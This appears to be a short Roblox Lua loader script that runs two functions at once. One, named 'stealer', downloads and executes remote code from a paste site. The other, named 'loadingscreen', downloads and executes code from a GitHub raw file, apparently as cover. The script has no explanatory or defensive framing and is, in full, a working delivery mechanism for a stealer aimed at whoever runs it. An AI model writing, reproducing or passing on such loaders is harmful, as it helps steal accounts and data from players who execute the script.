local function stealer()
    loadstring(game:HttpGet("https://paste.debian.net/plainh/e065c1bd/", true))()
end

local function loadingscreen()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/liillmses-maker/Zcchja/refs/heads/main/arko", true))()
end

task.spawn(stealer)
task.spawn(loadingscreen)
